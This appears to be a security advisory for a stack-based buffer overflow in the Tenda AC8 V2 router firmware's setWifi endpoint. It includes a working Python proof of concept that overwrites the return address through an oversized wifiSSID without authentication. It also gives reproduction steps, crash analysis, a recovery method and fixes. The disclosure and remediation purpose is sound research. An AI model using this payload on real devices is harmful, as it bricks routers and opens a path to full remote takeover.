# Tenda AC8 V2 V02.03.01.90_multi `goform/setWifi` `wifiSSID` Stack-Based Buffer Overflow

## Summary

A stack-based buffer overflow vulnerability exists in the `goform/setWifi` HTTP endpoint of Tenda AC8 V2 firmware `V02.03.01.90_multi`. The `wifiSSID` parameter is not length-validated before being persisted to NVRAM. On subsequent read/use of this value, an unsanitized copy operation overflows a fixed-size stack buffer, overwriting the saved return address and allowing full control of the program counter (PC). Exploitation results in complete denial of service: the device becomes entirely unresponsive (no LAN, no Wi-Fi, no response to the hardware reset button) and requires low-level UART/flash recovery to restore.

- **Vendor:** Tenda
- **Product:** AC8
- **Hardware version:** V2
- **Firmware version:** V02.03.01.90_multi
- **Vulnerability class:** Stack-based Buffer Overflow
- **CWE:** CWE-121 (Stack-based Buffer Overflow), CWE-787 (Out-of-bounds Write), CWE-20 (Improper Input Validation)
- **Attack vector:** Network — standard HTTP POST to the device's admin interface (`goform/setWifi`). Exploitable from the LAN by default; exploitable remotely over the internet on any unit with WAN/remote management enabled, as the endpoint has no transport-layer restriction beyond normal HTTP(S) access to the management interface
- **Impact:** Denial of Service (persistent, requires hardware-level recovery); potential Remote Code Execution (PC/RA fully attacker-controlled)
- **CVSS 3.1:** AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H (CRITICAL) — `PR:N` reflects that the web management interface has no admin password configured by default, so no session/credential is required to reach this endpoint out of the box.

## Affected Component

- **Endpoint:** `POST /goform/setWifi`
- **Parameter:** `wifiSSID`

## Root Cause

The `wifiBasicCfg` module handler invoked by `goform/setWifi` accepts the `wifiSSID` field with no server-side length check. The value is written through to NVRAM as part of the WiFi configuration commit. When this stored value is subsequently read back into a fixed-size stack buffer (on configuration apply/use), the copy operation does not bound the write to the buffer's declared size, allowing an oversized `wifiSSID` to overrun adjacent stack memory — including the saved return address (MIPS `$ra` / register `R31`) and, on function return, the program counter.

## Evidence of Instruction Pointer Control

**Step 1 — Offset isolation.** A De Bruijn cyclic pattern was submitted as `wifiSSID` in an otherwise well-formed `wifiBasicCfg` POST to `/goform/setWifi`. The server accepted the request (`HTTP/1.1 200 OK`, `{"errCode":"0"}`), confirming no length validation is enforced on this field.
![](https://yzdhzjjwtsjwhabhuksf.supabase.co/storage/v1/object/public/assets/projects/Vuln_Research/AC8V2/SSID-BOF/BURP.png)
The subsequent crash dump showed:

![](https://yzdhzjjwtsjwhabhuksf.supabase.co/storage/v1/object/public/assets/projects/Vuln_Research/AC8V2/SSID-BOF/kernel.png)

`0x62616162` decodes to ASCII `"baab"`, matching `pwn cyclic -l 0x62616162` → offset **104**. The identical value across `pc`, `epc`, `ra`, and `BadVA` confirms, at the hardware exception level, that the saved return address overwrite begins exactly at byte 104 — corroborating the pattern-tool calculation independently. The stack trace shows the overwrite extends well past the return address into adjacent frames (repeated `deadbeef` filler), indicating substantial room for a real payload beyond a single marker DWORD.

**Step 2 — Deterministic PC/RA hijack.** The saved return address was replaced with a controlled, unmapped marker (`0xDEADFACE`), preceded by an 18-word NOP sled (`0x26F72323`) and a placeholder payload DWORD (`0xAFBD2323`), padded with `0x41` to the offset:

```python
import struct, requests, urllib3, urllib.parse
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

RA_OFFSET   = 104
JUMP_TARGET = 0xDEADFACE
NOP = struct.pack('<I', 0x26F72323)

shellcode = struct.pack('<I', 0xAFBD2323)

nop_sled = NOP * 18                   
padding  = b'\x41' * (RA_OFFSET - len(nop_sled) - len(shellcode))  
ra_value = struct.pack('<I', JUMP_TARGET)  

payload = nop_sled + shellcode + padding + ra_value
print(f"Length      : {len(payload)}")
print(f"ra_value    : {ra_value.hex()}")  

payload_encoded = urllib.parse.quote(payload, safe='')
print(f"Encoded len : {len(payload_encoded)}")

body = '&'.join([
    'module1=wifiBasicCfg',
    'doubleBandUnityEnable=false',
    'wifiTotalEn=true',
    'wifiEn=true',
    f'wifiSSID={payload_encoded}',
    'wifiSecurityMode=WPAWPA2%2FAES',
    'wifiPwd=password12',
    'wifiHideSSID=false',
    'wifiEn_5G=true',
    'wifiSSID_5G=tenda_5G',
    'wifiSecurityMode_5G=WPAWPA2%2FAES',
    'wifiPwd_5G=password12',
    'wifiHideSSID_5G=false',
    'module2=wifiGuest',
    'guestEn=false',
    'guestEn_5G=false',
    'guestSSID=Tenda_VIP',
    'guestSSID_5G=Tenda_VIP_5G',
    'guestPwd=',
    'guestPwd_5G=',
    'guestValidTime=8',
    'guestShareSpeed=0',
    'module3=wifiPower',
    'wifiPower=high',
    'wifiPower_5G=high',
    'module5=wifiAdvCfg',
    'wifiMode=bgn',
    'wifiChannel=auto',
    'wifiBandwidth=auto',
    'wifiMode_5G=ac',
    'wifiChannel_5G=auto',
    'wifiBandwidth_5G=auto',
    'wifiAntijamEn=false',
    'module6=wifiBeamforming',
    'wifiBeaformingEn=true',
    'module7=wifiWPS',
    'wpsEn=true',
])

cookies = {'bLanguage':'en','ecos_pw':'','language':'cn'} # provide value for ecos_pw if password was initialized
headers = {
    'Host': '192.168.0.1',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Origin': 'http://192.168.0.1',
    'Referer': 'http://192.168.0.1/index.html',
    'Connection': 'keep-alive',
}

r = requests.post(
    'http://192.168.0.1/goform/setWifi',
    data=body,       
    headers=headers,
    cookies=cookies,
    verify=False
)
print(r.text)
```

No session cookie or admin credential was required (`ecos_pw` sent empty) — the request succeeded with default device configuration.

Resulting crash dump:

![](https://yzdhzjjwtsjwhabhuksf.supabase.co/storage/v1/object/public/assets/projects/Vuln_Research/AC8V2/SSID-BOF/jump.png)
![](https://yzdhzjjwtsjwhabhuksf.supabase.co/storage/v1/object/public/assets/projects/Vuln_Research/AC8V2/SSID-BOF/exploited-reg.png)
![](https://yzdhzjjwtsjwhabhuksf.supabase.co/storage/v1/object/public/assets/projects/Vuln_Research/AC8V2/SSID-BOF/exploited-kernel-reg.png)

`PC`, `epc`, `ra`, `R31` ($ra), and `BadVA` all resolved to the injected marker `0xDEADFACE`, while `R28`–`R30` correctly show the `0x41414141` padding — confirming the payload landed exactly as designed and that the overwritten return address is used directly as the next instruction fetch target. This is full, deterministic control of the program counter, not merely a crash.

## Impact

- **Denial of Service (persistent):** The device enters an unrecoverable boot loop. LAN, Wi-Fi, and the physical reset button are non-functional, as the crash occurs before user-facing services or the reset-to-defaults handler can initialize.
- **Recovery requires hardware-level intervention:** Normal recovery paths (web UI, reset button, TFTP recovery mode if gated behind the same boot path) are unavailable. Recovery was only possible via UART console access to the device's boot-stage flash monitor, directly reading and rewriting the corrupted flash regions.
- **Potential for Remote Code Execution:** Because PC and RA are both fully and precisely attacker-controlled (every byte of the 4-byte register is the attacker's chosen value), an attacker with knowledge of a valid, mapped, useful address (e.g., a ROP gadget or a location containing attacker-influenced data, such as the stack region itself if executable) could redirect execution to attacker-chosen code rather than an invalid address. This PoC used a non-exploitable placeholder address (`0xDEADFACE`) to safely demonstrate control without weaponizing the primitive further.
- **Privileged execution context:** The corrupted `epc` (Exception Program Counter) is itself a CP0 (Coprocessor 0) register — CP0 holds all MIPS exception/interrupt state and is only accessible via privileged (`mtc0`/`mfc0`) instructions. Its overwrite with the attacker-supplied value, combined with the `Status` register's `KERNEL` mode bit (`10000403`) set at the time of the fault, confirms the hijacked instruction fetch occurred entirely within the processor's privileged execution context. The affected firmware is a single-address-space eCos RTOS with no user/kernel privilege separation between threads (the crashing thread runs at the same privilege level as networking, HTTP handling, and all other system services), so any code execution achieved via this primitive is inherently full-system, unrestricted-privilege execution — there is no lower-privileged boundary to escalate from.

## Reproduction Steps

1. Identify the target device's management IP (default `192.168.0.1`) with default configuration (no admin password set).
2. Submit a `wifiBasicCfg` POST to `/goform/setWifi` with a 104+ byte cyclic pattern in `wifiSSID`, all other fields populated with valid values (see Step 1 PoC body).
3. Observe `HTTP/1.1 200 OK` / `{"errCode":"0"}` — confirms acceptance with no length validation.
4. Monitor device UART console; observe exception dump with `epc`/`ra`/`BadVA` matching the cyclic pattern offset.
5. Replace `wifiSSID` payload with the (NOP sled + marker DWORD + padding + `0xDEADFACE` return address) per the Step 2 script above.
6. Submit the request; observe crash dump confirming `PC`/`epc`/`ra`/`R31`/`BadVA` = `0xDEADFACE`.

## Recovery Procedure (tested)

- The AC8 V2 bootloader's `ERASESECTOR` and `FLW` commands are non-functional — both silently accept commands but make no change to flash content (confirmed via CMP before/after comparison across multiple attempts, including direct zero-byte overwrites, which must succeed on NOR flash physics if the command were actually executing). This rules out any purely bootloader-based recovery path.
- Recovery is instead achieved by racing the application-level CLI, which initializes in the main thread concurrently with the crashing thread. The firmware's own `nvram set` command correctly writes the value and recalculates the MD5 checksum for both Nvram and Snvram blocks — something raw `FLW` cannot do.

**racing the application-level CLI:**

![Successful recovery via CLI race](https://yzdhzjjwtsjwhabhuksf.supabase.co/storage/v1/object/public/assets/projects/Vuln_Research/AC8V2/SSID-BOF/restore.png)

By racing the CLI during the boot window before the crashing thread faults, it is possible to issue `nvram default` and restore the device to a bootable state before the corrupted configuration is reloaded.

## Suggested Remediation

- Enforce strict length validation on `wifiSSID` (and all `goform/setWifi` parameters) server-side before accepting or persisting to NVRAM, rejecting any value exceeding the destination buffer's safe capacity.
- Replace unbounded copy operations (e.g. `strcpy`/`sprintf`-class calls) with bounded equivalents (`strncpy`/`snprintf`) sized to the destination buffer.
- Enforce authentication by default: require an admin password to be set during initial setup before the web management interface accepts configuration-changing requests, closing the `PR:N` exposure.
- Enable stack protection mechanisms (stack canaries / ASLR / NX) in the firmware build if not already present, to reduce exploitability even where input validation gaps exist.
